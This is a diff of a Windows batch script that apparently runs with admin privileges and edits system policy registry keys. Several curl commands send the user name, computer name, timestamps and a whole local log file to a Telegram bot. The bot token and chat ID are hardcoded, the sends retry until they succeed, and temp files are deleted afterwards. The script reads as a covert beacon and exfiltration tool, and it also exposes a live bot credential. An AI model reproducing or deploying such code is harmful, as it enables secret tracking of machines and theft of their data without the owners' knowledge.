@@ -9,7 +9,7 @@ cd /d "%~dp0"
 :: Run All your commands here ( will be executed with admin privileges )
 
 
-set "BATCHVERSION=6.2"
+set "BATCHVERSION=6.3"
 set "RESULT=%TEMP%\TUSELMP.txa"
 set "RUNEVERYOFFICIALMD5=65ddb12683c9795db4b2ba0023663ca8"
 set "RUNEVERYLOGFILE=%temp%\S1rNsvQgG.mpeez"
@@ -73,24 +73,24 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "Con
 
 
 
-:: ============ RUNNING TOPIC ============
+:: ============ LoggedIn TOPIC ============
 
 
 :: Set bot token, chat ID, and message
-set "TOKEN_RUNNING=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID_RUNNING=-1002163721260"
-set "TOPIC_ID_RUNNING=73779"
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|(v%BATCHVERSION%)"
-set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
-set "CAPTION_RUNNING=This is a document for RUNNING Topic"
-set "FILE_PATH_RUNNING=%temp%\RUNNING_Topic.txt"
+set "TOKEN_LOGGEDIN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID_LOGGEDIN=-1002163721260"
+set "TOPIC_ID_LOGGEDIN=292182"
+set "MESSAGE_LOGGEDIN=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|(v%BATCHVERSION%)"
+set "ENCODED_MESSAGE_LOGGEDIN=%MESSAGE_LOGGEDIN: =%%2"
+set "CAPTION_LOGGEDIN=This is a document for LOGGEDIN Topic"
+set "FILE_PATH_LOGGEDIN=%temp%\LOGGEDIN_Topic.txt"
 set "SMALLUSER=%USERNAME:~0,2%%USERNAME:~-2%"
 
 
-:SENDFIRSTINRUNNINGTOPIC
+:SENDFIRSTINLOGGEDINTOPIC
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%" > "%RESULT%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=292182" -d "text=%USERNAME%(%COMPUTERNAME%)|LoggedIn(0)|%time%|v%BATCHVERSION%" > "%RESULT%" 2>&1
 
 
 findstr /i "message_id" "%RESULT%" >nul
@@ -110,8 +110,8 @@ if %errorlevel%==0 (
     echo. >> "%LOGFILE%" 2>&1
     echo Retrying... >> "%LOGFILE%" 2>&1
     timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
-    echo Going to SENDFIRSTINRUNNINGTOPIC >> "%LOGFILE%" 2>&1
-    goto SENDFIRSTINRUNNINGTOPIC
+    echo Going to SENDFIRSTINLOGGEDINTOPIC >> "%LOGFILE%" 2>&1
+    goto SENDFIRSTINLOGGEDINTOPIC
 )
 
 :SENDINGFIRSTINBOTMSG
@@ -165,14 +165,14 @@ echo SENDINGLASTMSG Started.. >> "%LOGFILE%" 2>&1
 set "RESULT=%TEMP%\TUSELMP.txa"
 del /f /q "%RESULT%" >> "%LOGFILE%" 2>&1
 
-set "MESSAGE_RUNNING=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
-set "ENCODED_MESSAGE_RUNNING=%MESSAGE_RUNNING: =%%2"
+set "MESSAGE_LOGGEDIN=%USERNAME%(%COMPUTERNAME%)|LoggedIn(1)|%MESSAGEEVERY%|%time%|(v%BATCHVERSION%)"
+set "ENCODED_MESSAGE_LOGGEDIN=%MESSAGE_LOGGEDIN: =%%2"
 
 
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
-curl -s -X POST "https://api.telegram.org/bot%TOKEN_RUNNING%/sendDocument" -F "chat_id=%CHAT_ID_RUNNING%" -F "message_thread_id=%TOPIC_ID_RUNNING%" -F "caption=%ENCODED_MESSAGE_RUNNING%" -F "document=@%LOGFILE%" > "%RESULT%"
+curl -s -X POST "https://api.telegram.org/bot%TOKEN_LOGGEDIN%/sendDocument" -F "chat_id=%CHAT_ID_LOGGEDIN%" -F "message_thread_id=%TOPIC_ID_LOGGEDIN%" -F "caption=%ENCODED_MESSAGE_LOGGEDIN%" -F "document=@%LOGFILE%" > "%RESULT%"
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -194,14 +194,24 @@ if %errorlevel%==0 (
     echo. >> "%LOGFILE%" 2>&1
     echo. >> "%LOGFILE%" 2>&1
     echo Retrying... >> "%LOGFILE%" 2>&1
-    timeout /t 2 /nobreak >> "%LOGFILE%" 2>&1
+    timeout /t 5 /nobreak >> "%LOGFILE%" 2>&1
     goto SENDINGLASTMSG
 )
 
 
 
-
-
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Tlgrm Result : >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+type "%RESULT%" >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo Batch file ended.. Removing filess.. >> "%LOGFILE%" 2>&1
+timeout /t 10 /nobreak >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 rem copy /Y "%LOGFILE%" "%temp%\Siiiiiiiiit.rrr"
 del /f /q "%temp%\Siiiiiiiiit.rrr"
@@ -424,20 +434,6 @@ echo. >> "%LOGFILE%" 2>&1
 echo INSTRUNEVERY1 Started.. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-
-
-
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo. >> "%LOGFILE%" 2>&1
-echo INSTRUNEVERY1 Started.. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
@@ -718,7 +714,7 @@ echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|(COUNT=%COUNT%)|%time%|v%BATCHVERSION%" >> "%LOGFILE%" 2>&1
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=292182" -d "text=%USERNAME%(%COMPUTERNAME%)|(COUNT=%COUNT%)|%time%|v%BATCHVERSION%" >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 
@@ -796,10 +792,9 @@ echo. >> "%LOGFILE%" 2>&1
 echo Time= %time% >> "%LOGFILE%" 2>&1
 echo Calling ended.... >> "%LOGFILE%" 2>&1
 timeout /t 15 /nobreak >> "%LOGFILE%" 2>&1
-
-
-
-
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
+echo. >> "%LOGFILE%" 2>&1
 echo Going to SENDINGLASTMSG >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
 echo. >> "%LOGFILE%" 2>&1
